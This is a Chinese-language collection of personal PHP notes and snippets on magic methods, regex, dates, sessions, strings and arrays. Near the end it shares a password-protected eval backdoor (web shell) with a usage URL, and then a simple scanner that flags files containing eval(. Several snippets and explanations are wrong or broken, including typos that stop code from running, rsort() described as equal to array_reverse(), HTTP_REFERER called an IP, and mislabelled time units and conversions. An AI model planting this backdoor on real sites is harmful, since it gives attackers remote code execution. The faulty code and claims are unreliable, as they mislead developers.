__sleep 串行化的时候用  
__wakeup 反串行化的时候调用  
serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。  
使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。  
相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。  
使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。  
9、__set_state  
当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。  
本方法的唯一参数是一个数组，其中包含按array(’property’ => value, …)格式排列的类属性。  
10、__invoke  
当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。  
PHP5.3.0以上版本有效  
11、__callStatic  
它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，  
PHP5.3.0以上版本有效  
PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此  

使用POSIX兼容规则的函数有：  
ereg_replace()  
ereg()  
eregi()  
eregi_replace()  
split()  
spliti()  
sql_regcase()  
mb_ereg_match()  
mb_ereg_replace()  
mb_ereg_search_getpos()  
mb_ereg_search_getregs()  
mb_ereg_search_init()  
mb_ereg_search_pos()  
mb_ereg_search_regs()  
mb_ereg_search_setpos()  
mb_ereg_search()  
mb_ereg()  
mb_eregi_replace()  
mb_eregi()  
mb_regex_encoding()  
mb_regex_set_options()  
mb_split()  
  
使用PERL兼容规则的函数有：  
preg_grep()  
preg_replace_callback()  
preg_match_all()  
preg_match()  
preg_quote()  
preg_split()  
preg_replace()  


+++++++json_encode()与json_decode()++++++++
<?php   
$json = '{"a":"php","b":"mysql","c":3}';  
$json_Class=json_decode($json);   
$json_Array=json_decode($json, true);   
print_r($json_Class);   
print_r($json_Array);   
?>
程序输出：
   stdClass Object ( 
    [a] => php 
    [b] => mysql 
    [c] => 3 ) 
    Array ( 
    [a] => php 
    [b] => mysql 
    [c] => 3 )  
在上面代码的前提下,访问对象类型$json_Class的a的值

echo $json_Class->{'a'};     //看这里，两者访问方法不一样
        程序输出：php
 访问数组类型$json_Array的a的值
echo $json_Array['a'];       //看这里，两者访问方法不一样
        程序输出：php   


++++++sleep()函数++++++死循环
无限执行程序，容易导致浏览器或电脑崩溃哟
ignore_user_abort();//关闭浏览器后，继续执行php代码
set_time_limit(0); //程序执行时间无限制
$intval=60; 
   do{
     $msg=date("Y-m-d H:i:s");
     echo date('Y-m-d H:i:s',time());
     file_put_contents("log.log",$msg,FILE_APPEND);//记录日志
    sleep($interval);//等待时间，进行下一次操作。
	
  }while(true);


+++++flush()与ob_flush()函数+++++++
实现php定时执行功能。
header("Content-Type: text/html");
set_time_limit(0);
$infoString = "Hello World";
while( isset($infoString) )
{
echo $infoString;
flush();  //把不在缓冲中的或者说是被释放出来的数据发送到浏览器
ob_flush(); //把数据从PHP的缓冲中释放出来，必须配合flush()使用
sleep(5);
}


++++个人电脑文件目录变更日志小程序+++++
实现功能：
实现子文件的文件读取，只写了两级，多级的话循环调就可以了
文件目录生成（使用序列化的格式，可以当作文件日志，当然你可以可以生成好看的排版格式）
文件变更对比，（本以为使用array_diff很容易实现，结果不知道返回值总是空，蛋疼，希望高手尝试一下）

<?php
/*扫描指定目录下文件 返回数组
 
*/
    function mydir($dir){
        $myfile = scandir($dir,1);
        foreach($myfile as $k=>$v){
         
        if(is_dir($dir."/".$v)==true&&$dir."/".$v !=$dir."/"."."&&$dir."/".$v !=$dir."/".".."){
            $sondir = $dir."/".$v;
            $sonfile = scandir($sondir);
             
            foreach($sonfile as $kk=>$vv)
            $result[$k][$kk]['filename'] = $vv;
            // $result[$k][$kk]['filesize'] = filesize($vv);//文件大小 单位字节
            $result[$k][$kk]['filectime'] = date("Y-m-d H:i:s",filectime($sondir."/".$vv));
            $result[$k][$kk]['fileatime'] = date("Y-m-d H:i:s",fileatime($sondir."/".$vv));//上次访问时间
        }else{
            $result[$k]['filename'] = $v;//文件名称
            // $result[$k]['filesize'] = filesize($v);//文件大小 单位字节
            // $result[$k]['fileowner'] = fileowner($v);//文件属于者         
            $result[$k]['filectime'] = date("Y-m-d H:i:s",filectime($dir."/".$v));//创建时间
            $result[$k]['fileatime'] = date("Y-m-d H:i:s",fileatime($dir."/".$v));//上次访问时间
        }
         
    }
        return $result;
     
    }
    //测试
    $mydir = mydir("F:\电影\Youku视频");
     
    $array = serialize($mydir);//序列化存储
    $fp = fopen("data.txt","a");//每次变化都追加到文件尾端写入（相当于日志）
    if(fwrite($fp,$array)){
        echo "文件日志生成ok";
        fclose($fp);
    }

++++PHP判断远程url是否有效的几种方法+++++

<?php 
$url = "http://cn.php.net/images/php.gif"; 
$array = get_headers($url,1); 
if(preg_match('/200/',$array[0])){ 
    echo "<pre/>"; 
    print_r($array); 
}else{ 
    echo "无效url资源！"; 
}

++++php判断是不是周末是不是工作日+++++
echo ( date('w') == 0 || date('w') == 6 ) ? '是周末' : '不是周末';


+++++php最完整时间日期星期年月日+++++
echo date("Y-m-d",strtotime("now")), "<br />";
echo date("Y-m-d",strtotime("-1 week Monday")), "离现在最近的周一<br />"; //离现在最近的周一
echo date("Y-m-d",strtotime("-1 week Sunday")), "离现在最近的周末<br />"; //离现在最近的周末
echo date("Y-m-d",strtotime("+0 week Monday")), "将要到来的周一<br />"; //将要到来的周一
echo date("Y-m-d",strtotime("+0 week Sunday")), "将要到来的周末<br />"; //将要到来的周末
echo date("n").'第几个月<br>';// 第几个月
echo date("w").'本周周几<br>';//本周周几
echo date("t").'本月天数<br>';// 本月天数
echo "<br />上周:<br />";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),date("d")-date("w")+1-7,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("d")-date("w")+7-7,date("Y"))),"<br />";
echo "<br>本周:<br>";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),date("d")-date("w")+1,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("d")-date("w")+7,date("Y"))),"<br />";
echo "<br>上月:<br>";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m")-1,1,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m") ,0,date("Y"))),"<br />";
echo "<br>本月:<br>";
echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),1,date("Y"))),"<br />";
echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("t"),date("Y"))),"<br />";
$getMonthDays = date("t",mktime(0, 0 , 0,date("n")+(date("n")-1)%3,1,date("Y")));//本季度未最后一月天数
echo "<br>本季度:<br>";
echo date('Y-m-d H:i:s', mktime(0, 0, 0,date('n')-(date('n')-1)%3,1,date('Y'))),"<br />";
echo date('Y-m-d H:i:s', mktime(23,59,59,date('n')+(date('n')-1)%3,$getMonthDays,date('Y'))),"<br />";
$jdtoday = gregoriantojd(date('n'), date('j'), date('y'));
$offset = jddayofweek($jdtoday)-1;
for($i=0-$offset; $i<7-$offset; $i++){
    $date = strtotime($i.' days');
    echo('<th>'.date('D', $date).'/'.date('n-j', $date).'</th>');
}
+++++本月月初月末的详细时间，距离此时此刻+++++
$y=date("Y",time());
$m=date("m",time());
$d=date("d",time());
$t0=date('t'); // 本月一共有几天
$t1=mktime(0,0,0,$m,1,$y); // 创建本月开始时间
$t2=mktime(23,59,59,$m,$t0,$y); // 创建本月结束时间
echo "今天时间\t".date("Y-m-d",time());
echo "本月开始\t".date("Y-m-d H:i:s",$t1);
echo "本月结束\t".date("Y-m-d H:i:s",$t2);
echo "时间差：";
echo $t2-$t1;

++++mb_substr()与mb_strcut()切割带有中文字符串的表现+++++++
<?php
echo mb_substr('这样一来我的字符串就不会有乱码^_^', 0, 7, 'utf-8');
?>
输出：这样一来我的字
<?php
echo mb_strcut('这样一来我的字符串就不会有乱码^_^', 0, 7, 'utf-8');
?>
输出：这样


+++php获取服务器详细信息++++++
获取系统类型及版本号：php_uname()(例：Windows&nbsp;NT&nbsp;COMPUTER&nbsp;5.1&nbsp;build&nbsp;2600)
只获取系统类型：php_uname('s')  (或：PHP_OS，例：Windows&nbsp;NT)
只获取系统版本号：;php_uname('r')&nbsp;&nbsp;(例：5.1)
获取PHP运行方式：php_sapi_name()&nbsp;(PHP&nbsp;run&nbsp;mode：apache2handler)
获取前进程用户名：Get_Current_User()
获取PHP版本：;PHP_VERSION
获取PHP安装路径：;DEFAULT_INCLUDE_PATH
获取当前文件绝对路径：p;__FILE__
获取Http请求中Host值：;$_SERVER["HTTP_HOST"];(返回值为域名或IP)
获取服务器IP:GetHostByName($_SERVER['SERVER_NAME'])
接受请求的服务器IP：$_SERVER["SERVER_ADDR"](有时候获取不到，推荐用：GetHostByName($_SERVER['SERVER_NAME']))
获取客户端IP：$_SERVER['REMOTE_ADDR']
获取服务器解译引擎：$_SERVER['SERVER_SOFTWARE']
获取服务器CPU数量：$_SERVER['PROCESSOR_IDENTIFIER']
获取服务器系统目录：$_SERVER['SystemRoot']
获取服务器域名：$_SERVER['SERVER_NAME'](建议使用：$_SERVER["HTTP_HOST"])
获取用户域名：$_SERVER['USERDOMAIN']
获取服务器语言：$_SERVER['HTTP_ACCEPT_LANGUAGE']
获取服务器Web端口：$_SERVER['SERVER_PORT']


+++++每个程序员都应该知道的 15 个最佳 PHP 库++++
15个最佳的PHP库，它们将帮助网站开发人员轻松提高网站的功能，优化PHP的开发时间。
1. PChart
PChart是一个令人印象深刻的PHP库，可以以一种可视化图表的形式生成文本数据。数据可以展示为柱状图，
饼状图，以及其他格式。使用SQL查询可以帮助PHP脚本创建令人惊叹的图表和图形。
2. PHP CAPTCHA
PHP CAPTCHA是另一个伟大的用于创建自动化音频和可视化CAPTCHA的PHP库。CAPTCHA系统是完全自动的使用图灵测试
来完成区分人和机器人的挑战。 PHP库需要PHP 4以及编译的FreeType文本和GD 1或2图像生成的支持。
3.Dispatch
Dispatch是一个简单的PHP库，可以定义URL规则以更好地组织网站。使用这个PHP库你可以匹配HTTP路径和要求，
显示器等的特定类型。结合Dispatch和本文中列出的其他库，开发人员就能有一个强大而简单的工作设置。
4. Services_JSON
Services_JSON允许人脑可读数据的传输。 PHP库的最新版本为服务器传输数据提供了极大的便捷。
5. phpAES
phpAES是支持128，192和256位AES加密密码的一类实现PHP代码。当涉及到汇编成PHP的时候，你不需要其他的扩展。
phpAES是全功能的，并且符合FIPS 197。
6. ImageWorkshop
ImageWorkshop是一个伟大的开源PHP库，允许你层次化地控制操作图像。使用PHP库，你可以裁剪、调整大小、添加水印、
制作缩略图等以不同的方式处理图像。 PHP库还可以更容易地进一步加强在web网站上所使用的图像。
7.Mink
Mink是另一个有用的PHP库，可以帮助你用互联网浏览器测试web页面的交互。该库删除了不同浏览器之间的API的差异，
从而给开发人员提供更好的测试环境。
8. PHP Thumbnailer
PHP Thumbnailer是一个简单的图像处理PHP库，能够帮助生成缩略图。此库不需要再安装外部库。PHP Thumbnailer提供了
对缩略图的多种控制，如根据高度、宽度、百分比调整缩略图大小，旋转图像，以及创建自定义的小图形，如正方形。
9.Hoa
Hoa是结构化，模块化，可扩展的PHP库，可创建研究和工业领域之间的链接。 此PHP库建议必不可少的范式、机制、算法，
以确保web站点的可靠性。
10. PHP Text to Image
PHP Text to Image是一个可以将文本转换成图像的PHP库。在某些简单的情况下，如显示email地址作为不能以编程方式发现
的图像的时候，这是很有用的。使用这个PHP库可以通过网络爬虫以及将它当作垃圾邮件来减少电子邮件地址泛滥。
11.Faker
Faker是一个非常有用的PHP库，可以在需要时创建假数据。使用这个PHP库，你可以执行各种诸如匿名数据，引导数据库，
创建XML文档，进行压力测试的任务。
12.PHP Image Upload Class
PHP Image Upload Class是一个功能强大的PHP库，可以简化上传图像到窗体表格的过程。通过这个库，
开发人员可以使用文件输入命令上传图片。开发人员也可以在类之外定义用户消息，通过gettext或类似的命令，在本地提供帮助。
13.Ratchet
使用Ratchet PHP库，web开发人员可以创建实时性以及在客户端和服务器之间双向性的应用程序。 这个PHP库能够帮助促进和
创造事件驱动应用程序，而不是使用传统的HTTP请求。
14. PHP Export XLS Class
PHP Export XLS Class是一个轻量级的，快速又简单的PHP库，可以导出不同类型的数据到Excel中。它可以转换各种数据格式
到.xls格式。此库还可工作于多个工作表，元数据（标题，作者，描述，等），不同的字体类型和风格，填充，单元格边框
和渐变。开发人员也可以使用PHP扩展来添加图像到工作表中。
15. phpDocumentor
phpDocumentor是一个很不错的自动文档工具，可以帮助我们创建一个使用PHP代码的专业文档。 该PHP库支持添加多种
不同的功能到网站。一些由PHP库支持的增值功能，包括支持合并自定义文档——例如教程，链接文档，创建高亮源代码，
功能交叉引用到PHP常规文档。 此PHP库可以帮助自动化文档。
16. PHP DB Class
PHP DB Class是一个伟大的PHP库，可以帮助开发PHP和MySQL。该工具可轻松方便地访问一个数据库，并减少执行任务所
需的代码数量。此外，此PHP库提供各种调试功能。例如，开发人员可以使用调试功能来显示请求和结果表，还可以通过
添加参数到它的类的方法来执行此任务。


{}大括号就是告诉PHP，括起来的部分要当成变量处理。如下例子：
<?php
$array=array('www','name'=>'phpernote','com');
echo "$array['name']";//用此句会报语法错误
echo "{$array['name']}";//此句正常，大括号内的字符将作为变量来处理


++++php字符串处理函数+++++
convert_uudecode — 解密一个字符串
convert_uuencode — 加密一个字符串
base64_encode: 将字符串以 BASE64 加密。 
base64_decode: 将 BASE64 编码字符串解密。 
str_rot13 — ROT13加密
str_rot13(str_rot13())-对str_rot13()解密
crypt()- 单向加密算法
md5()-不可逆散列
md5_file — 将一个文件进行MD5算法加密，不可逆的散列
sha1 — 将一个字符串进行SHA1算法加密，不可逆的散列
sha1_file — 将一个文件进行SHA1算法加密，不可逆的散列
str_word_count — 获取字符串里面的英文段落的个数
strip_tags — 去除一个字符串里面的HTML和PHP代码
addslashes — 用指定的方式对字符串里面的字符进行转义
addcslashes — 为字符串里面的部分字符添加反斜线转义字符
stripcslashes — 反转义addcslashes()函数转义处理过的字符串


+++++php定时跳转+++++
header("refresh:3;url=http://www.qq.com");
echo '正在加载，请稍等...<br>三秒后自动跳转';


++++ip2long()、long2ip()、checkdnsrr()、highlight_file()+++++
使用 ip2long() 和 long2ip() 函数来把 IP 地址转化成整型存储到数据库里。
在验证 email 地址的时候使用 checkdnsrr() 函数验证域名是否存在。
用 highlight_file('文件名') 来自动的打印出格式化的很漂亮的源代码.


++++php数组以键值重组新数组+++++
$reszz=M()->query("
select lxtel,id from ks_seller where lxtel in(
select lxtel from ks_preheat_remind where lxtel in( select lxtel from ks_seller) )
");
foreach($reszz as $k=>$v){
$kkk[$v['lxtel']].=$v['id'];
}


++++PHP左边用0填充补齐生成类似学号++++
<?php
	$num = 3;
	$bit = 7;//产生7位数的数字编号
	$num_len = strlen($num);
	$zero = '';
	for($i=$num_len; $i<$bit; $i++){
		$zero .= "0";
	}
	$real_num = "d".$zero.$num;
	echo $real_num;
?>


++++$_SERVER[‘REQUEST_TIME’]+++++
想知道脚本开始执行(译注：即服务器端收到客户端请求)的时刻，使用$_SERVER[‘REQUEST_TIME’]要好于time()。
echo "referer: " . $_SERVER["HTTP_REFERER"];PHP生成地址栏链接地址
显示所有为本版本PHP做出贡献的人的名单
echo phpcredits();

++PHP处理url+++++++
parse_url: 解析 URL 字符串。 
urldecode: 还原 URL 编码字符串。 
urlencode: 将字符串以 URL 编码。 



+++++PHP获取多个同名复选框的值的处理(完整正确版本)多选框的处理程序前台后台++++++
要获取同名的多个复选项框的值的时候,而且复选框的个数是不确定的,PHP和ASP的处理不同.ASP的REQUEST能将获取的复选框自动形成一个数组,要处理这些数值就很容易.比起ASP,PHP就麻烦些,它并没有这些功能(至少我目前未找到).
所以,处理这个问题的时候,我们可以通过JAVASCRIPT预处理,在点击提交的时候把这些复选框的值附加到一个隐藏域去,然后PHP可以获取到这个隐藏域的值,通过explode()函数分解为数组,这样就可以批量获得复选框的值了.
程序代码： 
<html>
<body>
<form name="form3" id="form1" action="getvalues.php" method="post">
   <input type="checkbox" name="checkbox1" value="1"><br>
   <input type="checkbox" name="checkbox1" value="2"><br>
   <input type="checkbox" name="checkbox1" value="3"><br>
   <input type="checkbox" name="checkbox1" value="4"><br>
   <input name="allcheckboxs" type="hidden" value=""><br>     <!--隐藏域,JS将会把值加在allcheckboxs-->
  <input type="submit" name="Submit3" value="提交" onClick="return allcheckbox();">  <!--提交时会激活checkbox()函数-->
</form>

<script language="javascript">
function allcheckbox() 
{ 
   
　form3.allcheckboxs.value = ""; 
　if ( !form3.checkbox1.length ) // 只有一个复选框，form3.checkbox1.length = undefined 
　{ 
　　if ( form3.checkbox1.checked ) 
　　　form3.allcheckboxs.value = form3.checkbox1.value; 
　} 
　else 
　{ 
　　for ( i = 0 ; i < form3.checkbox1.length ; i++ ) 
　　{ 
　　　if ( form3.checkbox1(i).checked ) // 复选框中有选中的框 
　　　{ 
　　　　form3.allcheckboxs.value = form3.checkbox1(i).value; 
　　　　for ( j = i + 1 ; j < form3.checkbox1.length ; j++ ) 
　　　　{ 
　　　　　if ( form3.checkbox1(j).checked ) 
　　　　　{ 
　　　　　　form3.allcheckboxs.value += ","; //用,做分割符 
　　　　　　form3.allcheckboxs.value += form3.checkbox1(j).value; 
　　　　　} 
　　　　} 
　　　　break; 
　　　} 
　　} 
　} 
　return true; 
}

</script>
</body>
</html>

下面是处理程序代码：
getvalues.php

<?php
if ((isset($_POST["allcheckboxs"])) && ($_POST["allcheckboxs"] != "")) {
 $allcheckboxs_val= explode(",", $_POST["allcheckboxs"]); 
  for ($i=0;$i<count($allcheckboxs_val);$i++){
     echo $allcheckboxs_val[$i]."<br>";//arhwen.com
}
}
?>


++++PHP百分数转小数++++
$a = "20.544545%";  
echo (float)$a/100;


++++PHP中pack()和unpack()函数++++
pack 对应的还有个函数为 unpack ，用于压缩二进制串，能减少串存储空间。
$pass_hash = pack("H*", md5("my-password"));
echo $pass_hash;

+++++cal_days_in_month() 函数+++++
cal_days_in_month() 函数针对指定的年份和日历，返回一个月中的天数。
语法：cal_days_in_month(calendar,month,year)。
案例：
$days = cal_days_in_month(CAL_GREGORIAN, 2, 2015); 
echo $days;

++gettext()也就是_()+++++
利用gettext实现多国语系支持！
搭建环境
1，首先查看你的php扩展目录下是否有php_gettext.dll这个文件，如果没有，这就需要你下载一个或是从其他地方拷贝一个，然后放到php扩展目录。
2，打开php.ini，查找”;extension=php_gettext.dll“ ，然后去除注释，重启apache。
步骤二:原理讲解
假如你的没有国际化的程序里有这样的代码，echo "你好";,而国际化的程序你要写成 echo gettext("你好");，然后再在配置文件里添加“你好”相对应的英文“Hi”。
步骤三：编码测试
 <?php 
$domain = 'test';
bindtextdomain($domain, "locale/");//设置某个域的mo文件路径
textdomain($domain);//设置gettext()函数从哪个域去找mo文件
echo gettext("Hi!");//_()是gettext()函数的简写形式
步骤四：配置文件的生成
太多，见http://www.cnblogs.com/lost-1987/articles/3309693.html

+++natsort()++
PHP自然排序，类似与ksort() sort()等等

+++global()+++++取出目录中的特定文件
foreach (glob("*.php") as $file) {
    echo "$file<br>";
}


++++查看系统默认支持什么函数+++++
$arr = get_defined_functions(); 
Function php() {
}
echo   "<pre>"; 
Echo   "这里显示系统所支持的所有函数,和自定以函数phpn";
print_r($arr); 
echo   "</pre>"; 

+++使Html/PHP格式的字符串不被解释,而是照原样显示++++
$str="<h1>PHP</h1>";
echo "被解释过的: ".$str."<br>经过处理的:";
echo   htmlentities(nl2br($str));

$_SERVER['DOCUMENT_ROOT'];运行脚本的文档根目录
$_SERVER['HTTP_HOST']; 头部的内容
$_SERVER['HTTP_REFERER'];前一个页面的IP
求3个值中最大值得函数：
function maxmun($a,$b,$c){
	return $a>$b?($a>$c?$a:$c):($b>$c?$b:$c);
}
POST传输的最大容量默认是8M;
GET是2kb;

对字符进行编码，保证编码可逆：
$a='hello';
$b="world";
$a=base64_encode($a);
$b=base64_encode($b);
$a=$a.'&'.$b;
$b=explode('&',$a);
$a=base64_decode($b[1]);
$b=base64_decode($b[0]);
echo $a,$b;


1234567890转换成1,234,567,890.
$str='1234567890';
function str($str){
	$str=strrev($str);
	$str=chunk_split($str,3,',');
	$str=strrev($str);
	$str=ltrim($str,',');
	return $str;
}

如何实现字符串翻转。(strtev会报错)
function strrev_utf8($str){
	return join("",array_reverse(preg_split("//u",$str)));
}

var_dump(in_array('01',array('1'))); //boolean true
var_dump('01' == 1);  //boolean true

strcasecmp() 函数比较两个字符串。
strcasecmp() 函数是二进制安全的，且不区分大小写。
echo strcasecmp('1222','1233');   //若相等返回0，反之自己猜

将09转换成十进制数字
echo decbin('09');

array_map() 函数返回用户自定义函数作用后的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数.
这个绝对好用,可以对数组中每一个值进行操作。
$arr=array('hello','world');
$arr=array_map('ucfirst',$arr);
var_dump($arr);
Hello World

rsort()与array_reverse()效果相同。使数组元素顺序调换。

输出当前北京时间，不用考虑转换。绝对标准。
date_default_timezone_set("PRC");
echo date("Y-m-d H:i:s",time());

计算某字符串中某个字符出现的次数：
echo substr_count('tbsbstbbsrb','t');

array_unshift将元素添加到数组开头。
$arrr=array('james','tom','symfony');
array_unshift($arrr,'jack');
var_dump($arrr);

$arrr=array('james','tom','symfony');
1.如果没有指定个数，则返回随机的键名，0啊，1啊，2啊，或者其他
$randvalue=array_rand($arrr);
var_dump($randvalue);
结果肯是：
int 1 
1.指定了个数，则返回随机数组
$randvalue=array_rand($arrr，2);
var_dump($randvalue);
结果可能是：
array (size=2)
  0 => int 1
  1 => int 3


<?php
class a{
function __construct(){
	echo 'a ';
	}
}
class b extents a{

	function __construct(){
		echo 'b';
	}
}
$a =new b();
会输出：
b
分析：
类b继承自类a，两个类都定义了构造函数，由于二者名字相同，所有子类中的构造函数
覆盖了父类的构造函数，要想子类对象也执行父类的构造函数，需要在子类构造函数中使用parent::__construct()来调用父类构造函数。

++++读取网页内容++++
$res=fopen('http://www.qq.com','rb');
$contents=stream_get_contents($res);
fclose($res);
echo $contents;
上面的就等于
echo file_get_contents('http://www.qq.com');

解释下面正则的意思：
((^\s*)|(\s*$))
匹配以0个或多个空白符开头或者0个或者多个空白符结尾的字符串。


++++修改session生存时间+++++
1.将php.ini中的session.gc_maxlifttime设置为9999重启Apache；
2.
$savePath='./session_save_dir/';
$lifeTime=3600;
session_save_path($savePath);
session_set_cookie_params($lifeTime);
seesion_start();
3.
session_start();
$lifeTime=3600; //1分钟
setCookie(session_name(),session_id(),time()+$lifeTime,'/');


//设置一个cookie的名字为username，值为jack,一周后失效，
setcookie('username','jack',time()+7*24*3600);


七层网络模型名称：
物理层、数据链路层、网络层、传输层、会话层、表示层、应用层。


++PHP中eval()函数++++++
eval("echo 'hello world';");
等同于下面的代码：
echo "hello world";
在浏览器中输出：hello world;
注意点：
1.eval函数的参数的字符串末尾一定要有分号，在最后还要另加一个分号（这个分号是php限制）
2.注意单引号，双引号和反斜杠的运用。如果参数中带有变量时,并且变量有赋值操作的话，
变量前的$符号钱一定要有\来转义。如果没有赋值操作可以不需要。
分享个php eval后门程序：
使用方法
http://url/test.php?pwd=admin&action=eval&a=phpinfo();
代码如下：
<?php
$passwd="admin";if($_GET['pwd']!=$passwd)exit;
if($_GET['action']=="eval" && $_GET['a']){eval($_GET['a']);}
?>


+++++PHP检测木马程序+++++++
function parAllFiles($d)
{
    $dh = dir($d);
    while($filename = $dh->read() )
    {
        if($filename=='.' || $filename=='..') continue;
        $tfile = $d.'/'.$filename;
        if(is_dir($tfile))
        {
            //echo "检查到： $tfile ";
            parAllFiles($tfile);
        }
        else
        {
            if(!ereg("\.php", $tfile)) continue;
            $bd = file_get_contents($tfile);
            if(eregi("eval\(", $bd))
            {
                echo "$tfile\r\n";
            }
        }
    }
}
parAllFiles(dirname(__FILE__));


++++str_pad()函数+++++
str_pad()函数把字符串填充为指定的长度。
str_pad(string,length,pad_string,pad_type)
pad_type:
STR_PAD_BOTH，填充到字符串两头；
STR_PAD_LEFT;填充到左边；
STR_PAD_RIGHT;填充到右边。
$str="Hello world";
echo str_pad($str,20,'..');


+++flush()函数++++
 //会每隔1s输出一个数字，但是使用ob_flush()会等待5s一起输出
 echo str_repeat("-",60);
	for($i=0;$i<5;$i++){
		echo $i;	
		sleep(1);
		flush();
	}
    

++pack与unpack+++
echo pack("C*",80,72,80);